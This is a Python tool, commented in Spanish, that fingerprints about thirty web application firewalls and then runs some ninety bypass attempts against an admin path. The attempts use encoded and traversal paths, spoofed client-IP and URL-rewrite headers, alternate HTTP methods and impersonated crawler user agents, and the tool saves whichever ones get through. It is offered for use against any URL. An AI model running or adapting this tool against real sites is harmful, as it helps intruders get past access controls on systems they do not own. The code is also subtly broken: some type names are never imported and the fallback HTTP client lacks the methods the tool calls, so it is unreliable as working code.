#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
WAF TOOLS v3.0 - TANQUE EDITION
Detección de 30+ WAFs · 100+ técnicas de bypass · Fingerprinting avanzado
"""

import asyncio
import sys
import random
from urllib.parse import urlparse

try:
    from http_client import HTTPClient
except ImportError:
    class HTTPClient:
        async def __aenter__(self): return self
        async def __aexit__(self, *args): pass
        async def get(self, url): return None

class WAFTools:
    def __init__(self, target: str):
        self.target = target.rstrip('/')
        self.parsed = urlparse(target)
        self.client = None
        self.detected_wafs = []
        
        # Firmas de WAF (30+)
        self.waf_signatures = {
            'cloudflare': {
                'headers': ['cf-ray', 'cf-cache-status', '__cfduid', 'cf-request-id'],
                'cookies': ['__cfduid', '__cf_bm'],
                'response': ['cloudflare-nginx', 'CloudFlare', 'cdn-cgi'],
                'code': [403, 503]
            },
            'aws_waf': {
                'headers': ['x-amzn-RequestId', 'x-amzn-ErrorType', 'x-amz-cf-id'],
                'response': ['AWS WAF', 'Amazon Web Services', 'CloudFront'],
                'code': [403]
            },
            'cloudfront': {
                'headers': ['x-amz-cf-id', 'x-amz-cf-pop'],
                'response': ['CloudFront'],
                'code': [403]
            },
            'fastly': {
                'headers': ['x-fastly-request-id', 'x-served-by'],
                'response': ['Fastly'],
                'code': [403, 503]
            },
            'akamai': {
                'headers': ['x-akamai-transformed', 'x-akamai-request-id'],
                'response': ['AkamaiGHost', 'Akamai'],
                'code': [403, 401]
            },
            'incapsula': {
                'cookies': ['incap_ses', 'visid_incap'],
                'response': ['Incapsula'],
                'code': [403]
            },
            'sucuri': {
                'headers': ['x-sucuri-id', 'x-sucuri-cache', 'x-sucuri-block'],
                'cookies': ['sucuri_cloudproxy_uuid'],
                'response': ['Sucuri', 'CloudProxy', 'sucuri.net'],
                'code': [403]
            },
            'imperva': {
                'headers': ['x-iinfo', 'x-cdn'],
                'cookies': ['incap_ses', 'visid_incap', '_incap'],
                'response': ['Imperva', 'Incapsula'],
                'code': [403]
            },
            'f5_bigip': {
                'headers': ['x-cnection', 'x-wa-info'],
                'cookies': ['BIGipServer', 'F5_fullWT', 'TS*'],
                'response': ['BigIP', 'F5 Networks'],
                'code': [403, 200]
            },
            'mod_security': {
                'headers': ['x-mod-security', 'x-modsec'],
                'response': ['ModSecurity', 'OWASP', 'Trustwave'],
                'code': [403, 406, 501]
            },
            'wordfence': {
                'cookies': ['wfvt', 'wordfence_verifiedHuman'],
                'response': ['Wordfence', 'wfwaf'],
                'code': [403]
            },
            'barracuda': {
                'headers': ['x-bn-passthrough', 'x-barracuda'],
                'response': ['Barracuda', 'BarracudaWAF'],
                'code': [403]
            },
            'fortinet': {
                'headers': ['x-fortinet'],
                'response': ['FortiWeb', 'Fortinet'],
                'code': [403]
            },
            'citrix': {
                'headers': ['x-netscaler', 'x-netscaler-request-id'],
                'response': ['NetScaler', 'Citrix'],
                'code': [403]
            },
            'armor': {
                'headers': ['x-armor-request-id'],
                'response': ['Armor', 'Armor Defense'],
                'code': [403]
            },
            'stackpath': {
                'headers': ['x-sp-edge', 'x-sp-cache'],
                'response': ['StackPath', 'SP'],
                'code': [403]
            },
            'comodo': {
                'headers': ['x-cfwaf'],
                'response': ['Comodo', 'Comodo WAF'],
                'code': [403]
            },
            'radware': {
                'headers': ['x-radware'],
                'response': ['Radware', 'AppWall'],
                'code': [403]
            },
            'reboot': {
                'headers': ['x-reboot-waf'],
                'response': ['Reboot', 'RebootWAF'],
                'code': [403]
            },
            'sitelock': {
                'headers': ['x-sitelock'],
                'response': ['SiteLock', 'TrueShield'],
                'code': [403]
            },
            'sophos': {
                'headers': ['x-sophos'],
                'response': ['Sophos', 'UTM'],
                'code': [403]
            },
            'wallarm': {
                'headers': ['x-wallarm'],
                'response': ['Wallarm', 'Wallarm WAF'],
                'code': [403]
            },
            'webknight': {
                'headers': ['x-webknight'],
                'response': ['WebKnight', 'AQTRONIX'],
                'code': [403]
            },
            'yundun': {
                'headers': ['yundun'],
                'response': ['Yundun', 'YundunWAF'],
                'code': [403]
            },
            'safe3': {
                'headers': ['x-safe3'],
                'response': ['Safe3WAF'],
                'code': [403]
            },
            'dotdefender': {
                'headers': ['x-dotdefender'],
                'response': ['dotDefender'],
                'code': [403]
            },
            'webarx': {
                'headers': ['x-webarx'],
                'response': ['WebARX'],
                'code': [403]
            },
            'ninjafirewall': {
                'headers': ['x-ninjafirewall'],
                'response': ['NinjaFirewall'],
                'code': [403]
            },
            'securesphere': {
                'headers': ['x-securesphere'],
                'response': ['SecureSphere'],
                'code': [403]
            }
        }
        
        # Técnicas de bypass (100+)
        self.bypass_techniques = self._generate_bypass_techniques()
        
    def _generate_bypass_techniques(self) -> list:
        """Genera todas las técnicas de bypass"""
        techniques = []
        
        # 1. Path manipulation (30+)
        path_techs = [
            ('trailing slash', '/admin/'),
            ('double slash', '//admin//'),
            ('encoded slash', '/admin%2f'),
            ('wildcard', '/admin/*'),
            ('path traversal', '/admin/..;/'),
            ('dot slash', '/admin/.'),
            ('encoded dot', '/admin%2e'),
            ('unicode slash', '/admin%ef%bc%8f'),
            ('unicode dot', '/admin%ef%bc%8e'),
            ('hex encoded', '/admin%2f%2e%2e'),
            ('double encoded', '/admin%252f'),
            ('triple encoded', '/admin%25252f'),
            ('path parameter', '/admin;param=value'),
            ('fragment', '/admin#test'),
            ('query string', '/admin?test=1'),
            ('backslash', '/admin\\'),
            ('space', '/admin%20'),
            ('newline', '/admin%0a'),
            ('carriage', '/admin%0d'),
            ('tab', '/admin%09'),
            ('uppercase', '/ADMIN'),
            ('lowercase', '/admin'),
            ('mixed case', '/AdMiN'),
            ('reverse', '/nimda'),
            ('null byte', '/admin%00'),
            ('asterisk', '/admin*'),
            ('tilde', '/admin~'),
            ('percent', '/admin%'),
            ('semicolon', '/admin;'),
            ('parenthesis', '/admin()'),
        ]
        
        for name, value in path_techs:
            techniques.append({
                'type': 'path',
                'name': name,
                'value': value
            })
            
        # 2. Header techniques (30+)
        header_techs = [
            ('X-Forwarded-For localhost', {'X-Forwarded-For': '127.0.0.1'}),
            ('X-Forwarded-For subnet', {'X-Forwarded-For': '192.168.0.1'}),
            ('X-Original-URL', {'X-Original-URL': '/admin'}),
            ('X-Rewrite-URL', {'X-Rewrite-URL': '/admin'}),
            ('X-Real-IP', {'X-Real-IP': '127.0.0.1'}),
            ('CF-Connecting-IP', {'CF-Connecting-IP': '127.0.0.1'}),
            ('True-Client-IP', {'True-Client-IP': '127.0.0.1'}),
            ('X-Client-IP', {'X-Client-IP': '127.0.0.1'}),
            ('X-Remote-IP', {'X-Remote-IP': '127.0.0.1'}),
            ('X-Remote-Addr', {'X-Remote-Addr': '127.0.0.1'}),
            ('X-Host', {'X-Host': 'localhost'}),
            ('X-Forwarded-Host', {'X-Forwarded-Host': 'localhost'}),
            ('X-Forwarded-Server', {'X-Forwarded-Server': 'localhost'}),
            ('X-HTTP-Method-Override', {'X-HTTP-Method-Override': 'GET'}),
            ('X-Method-Override', {'X-Method-Override': 'GET'}),
            ('Cache-Control', {'Cache-Control': 'no-cache'}),
            ('Pragma', {'Pragma': 'no-cache'}),
            ('X-Cache-Bypass', {'X-Cache-Bypass': '1'}),
            ('X-Forwarded-Proto http', {'X-Forwarded-Proto': 'http'}),
            ('X-Forwarded-Proto https', {'X-Forwarded-Proto': 'https'}),
            ('X-Forwarded-Port 80', {'X-Forwarded-Port': '80'}),
            ('X-Forwarded-Port 443', {'X-Forwarded-Port': '443'}),
            ('X-Forwarded-Scheme http', {'X-Forwarded-Scheme': 'http'}),
            ('X-Forwarded-Scheme https', {'X-Forwarded-Scheme': 'https'}),
            ('X-URL-Scheme http', {'X-URL-Scheme': 'http'}),
            ('X-URL-Scheme https', {'X-URL-Scheme': 'https'}),
            ('X-Forwarded-For multiple', {'X-Forwarded-For': '127.0.0.1, 127.0.0.1'}),
            ('X-Forwarded-For subnet', {'X-Forwarded-For': '10.0.0.1'}),
            ('X-Originating-IP', {'X-Originating-IP': '127.0.0.1'}),
            ('X-Remote-IP', {'X-Remote-IP': '127.0.0.1'}),
        ]
        
        for name, headers in header_techs:
            techniques.append({
                'type': 'header',
                'name': name,
                'headers': headers
            })
            
        # 3. HTTP methods (10+)
        methods = ['POST', 'HEAD', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 
                  'TRACE', 'CONNECT', 'PROPFIND', 'PROPPATCH', 'MKCOL']
        
        for method in methods:
            techniques.append({
                'type': 'method',
                'name': f'method {method}',
                'method': method
            })
            
        # 4. User-Agents (20+)
        uas = [
            ('Chrome Windows', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0'),
            ('Firefox Windows', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Firefox/122.0'),
            ('Safari Mac', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15'),
            ('iPhone', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) Safari/605.1.15'),
            ('Android', 'Mozilla/5.0 (Linux; Android 14) Chrome/120.0.6099.210'),
            ('Googlebot', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'),
            ('Bingbot', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),
            ('Twitterbot', 'Twitterbot/1.0'),
            ('Facebookbot', 'facebookexternalhit/1.1'),
            ('curl', 'curl/8.4.0'),
            ('Wget', 'Wget/1.21.4'),
            ('Python', 'Python-urllib/3.11'),
            ('Go', 'Go-http-client/1.1'),
            ('Java', 'Java/17.0.2'),
            ('Nokogiri', 'Nokogiri/1.15.4'),
            ('PhantomJS', 'PhantomJS/2.1.1'),
            ('Headless Chrome', 'HeadlessChrome/120.0.6099'),
            ('Google Favicon', 'Mozilla/5.0 (compatible; Google-Favicon)'),
            ('Google Ads', 'Mozilla/5.0 (compatible; Google-Apps-Script)'),
            ('Amazon Bot', 'Amazon CloudFront'),
        ]
        
        for name, ua in uas:
            techniques.append({
                'type': 'ua',
                'name': f'ua {name}',
                'headers': {'User-Agent': ua}
            })
            
        return techniques
        
    async def setup(self):
        """Inicializa cliente HTTP"""
        self.client = HTTPClient(timeout=10, max_retries=2)
        
    async def detect(self) -> List[str]:
        """Detecta WAF activo"""
        print(f"\n🛡️ WAF DETECTION v3.0 TANQUE - {self.target}")
        print("-" * 70)
        
        try:
            resp = await self.client.get(self.target)
            if not resp:
                print("[!] No se pudo conectar")
                return []
                
            headers = resp.headers
            text = await resp.text()
            
            print("[*] Analizando headers y respuesta...")
            
            for waf_name, waf_data in self.waf_signatures.items():
                # Headers
                for header in waf_data.get('headers', []):
                    if header in headers:
                        self.detected_wafs.append({
                            'waf': waf_name,
                            'evidence': f'header: {header}'
                        })
                        
                # Response content
                for pattern in waf_data.get('response', []):
                    if pattern.lower() in text.lower():
                        self.detected_wafs.append({
                            'waf': waf_name,
                            'evidence': f'response: {pattern}'
                        })
                        
                # Status codes
                if resp.status in waf_data.get('code', []):
                    self.detected_wafs.append({
                        'waf': waf_name,
                        'evidence': f'status: {resp.status}'
                    })
                    
        except Exception as e:
            print(f"   Error: {e}")
            
        if self.detected_wafs:
            unique = set([d['waf'] for d in self.detected_wafs])
            print(f"\n[OK] WAF DETECTADO:")
            for waf in unique:
                evidence = [d['evidence'] for d in self.detected_wafs if d['waf'] == waf][:3]
                print(f"   • {waf.upper()}")
                print(f"     ↳ {', '.join(evidence)}")
            return list(unique)
        else:
            print("\n❌ No se detectó WAF")
            return []
            
    async def test_bypass(self, technique: dict, path: str = '/admin') -> Optional[dict]:
        """Prueba una técnica de bypass"""
        try:
            url = self.target
            headers = {}
            method = 'GET'
            
            if technique['type'] == 'path':
                url = f"{self.target}{technique['value']}"
            elif technique['type'] == 'header':
                url = f"{self.target}/{path}"
                headers = technique['headers']
            elif technique['type'] == 'method':
                url = f"{self.target}/{path}"
                method = technique['method']
            elif technique['type'] == 'ua':
                url = f"{self.target}/{path}"
                headers = technique['headers']
            else:
                return None
                
            resp = await self.client.request(method, url, headers=headers)
            
            if not resp:
                return None
                
            # Si no es 403, puede ser bypass
            if resp.status not in [401, 403, 404]:
                text = await resp.text()
                return {
                    'technique': technique['name'],
                    'type': technique['type'],
                    'url': url,
                    'method': method,
                    'status': resp.status,
                    'size': len(text)
                }
                
        except Exception as e:
            pass
        return None
        
    async def bypass(self, path: str = '/admin') -> List[dict]:
        """Intenta bypassear el WAF"""
        print(f"\n🔓 WAF BYPASS v3.0 TANQUE - {self.target}{path}")
        print(f"[*] Probando {len(self.bypass_techniques)} técnicas...")
        print("-" * 70)
        
        # Baseline
        try:
            baseline = await self.client.get(f"{self.target}/{path}")
            print(f"[*] Baseline: {baseline.status if baseline else 'ERROR'}")
        except:
            print(f"[*] Baseline: ERROR")
            
        results = []
        
        # Probar en batches
        batch_size = 20
        for i in range(0, len(self.bypass_techniques), batch_size):
            batch = self.bypass_techniques[i:i+batch_size]
            tasks = [self.test_bypass(t, path) for t in batch]
            batch_results = await asyncio.gather(*tasks)
            
            for r in batch_results:
                if r:
                    results.append(r)
                    
            # Mostrar progreso
            print(f"   Progreso: {min(i+batch_size, len(self.bypass_techniques))}/{len(self.bypass_techniques)}")
            
        if results:
            print(f"\n[OK] BYPASSES ENCONTRADOS: {len(results)}")
            
            # Agrupar por tipo
            by_type = {}
            for r in results:
                if r['type'] not in by_type:
                    by_type[r['type']] = []
                by_type[r['type']].append(r)
                
            for t, items in by_type.items():
                print(f"\n   {t.upper()}: {len(items)}")
                for r in items[:5]:
                    print(f"      • {r['technique']}: {r['status']} ({r['size']} bytes)")
                    
            # Guardar resultados
            with open(f"waf_bypass_{self.parsed.netloc}.txt", 'w') as f:
                for r in results:
                    f.write(f"{r['technique']}\t{r['url']}\t{r['status']}\n")
            print(f"\n💾 Resultados guardados en waf_bypass_{self.parsed.netloc}.txt")
        else:
            print("\n❌ No se encontraron bypasses")
            
        return results
        
    async def run(self, path: str = '/admin'):
        """Ejecuta detección + bypass"""
        wafs = await self.detect()
        
        if wafs:
            print(f"\n⚡ WAF detectado: {', '.join(wafs)}")
        else:
            print("\n⚡ No se detectó WAF, pero igual probando bypass...")
            
        bypasses = await self.bypass(path)
        
        return {
            'wafs': wafs,
            'bypasses': bypasses
        }

async def main():
    if len(sys.argv) < 2:
        print("Uso: python3 waf_tools.py <URL> [path]")
        print("Ejemplo: python3 waf_tools.py https://ejemplo.com")
        print("         python3 waf_tools.py https://ejemplo.com /admin")
        sys.exit(1)
        
    url = sys.argv[1]
    path = sys.argv[2] if len(sys.argv) > 2 else '/admin'
    
    tools = WAFTools(url)
    await tools.run(path)

if __name__ == "__main__":
    asyncio.run(main())
